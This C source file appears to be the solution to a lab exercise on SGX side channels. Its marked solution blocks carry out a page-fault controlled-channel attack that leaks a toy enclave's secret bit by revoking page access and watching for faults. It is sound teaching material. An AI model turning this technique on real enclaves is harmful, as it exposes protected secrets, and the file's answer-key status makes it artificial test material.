/* utility headers */
#include "debug.h"
#include "pf.h"
#include "cacheutils.h"
#include <sys/mman.h>
#include <string.h>
#include "victim.h"

#define TEST_STRING     "DeaDBEeF"

int fault_fired = 0;
void *page_pt = NULL;

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    // mark it WRITABLE
    mprotect(base_adrs, 0x1000, PROT_WRITE);
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    int rv = 1, secret = 0;
    char *string;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);

    info("secret at %p\n", secret_pt);

    /* ---------------------------------------------------------------------- */
    info_event("Calling enclave..");
    string = malloc(strlen(TEST_STRING)+1);
    strcpy(string, TEST_STRING); 
    ecall_to_lowercase(string);
    info("secure enclave converted '%s' to '%s'", TEST_STRING, string);

    /* =========================== START SOLUTION =========================== */
    // addr of element next to secret_pt, which is next page
    page_pt = secret_pt + 1;

    // as secret=0, the length of string starting at secret_pt is 0 and next element(next page) will not be accessed for checking string length
    ecall_set_secret(0);
    mprotect(page_pt, 0x1000, PROT_NONE);
    ecall_to_lowercase(secret_pt);

    if(fault_fired == 1) printf("secret = 1\n");
    else printf("secret = 0\n");

    // as secret=1, the length of string starting at secret_pt is 1 and next element(next page) will be accessed for checking string length
    ecall_set_secret(1);

    mprotect(page_pt, 0x1000, PROT_NONE);
    fault_fired = 0;
    ecall_to_lowercase(secret_pt);

    if(fault_fired == 1) printf("secret = 1\n");
    else printf("secret = 0\n");
    /* =========================== END SOLUTION =========================== */
    
    info("all is well; exiting..");
	return 0;
}
